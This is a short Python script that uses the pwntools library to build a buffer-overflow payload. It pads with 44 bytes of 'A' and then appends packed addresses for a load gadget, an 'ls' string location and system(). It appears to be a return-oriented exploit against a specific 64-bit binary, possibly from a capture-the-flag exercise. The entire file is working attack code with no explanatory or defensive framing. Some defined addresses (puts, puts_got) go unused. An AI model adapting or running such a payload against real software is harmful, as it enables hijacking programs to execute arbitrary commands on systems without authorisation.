from pwn import *


puts = p64(0x100000598)
puts_got = p64(0x100004000)
ldp = p64(0x100000548)
ls = p64(0x100008000)

system = p64(0x1937e8368)

p = b"A"*44
p += ldp + ls + system


print(p)
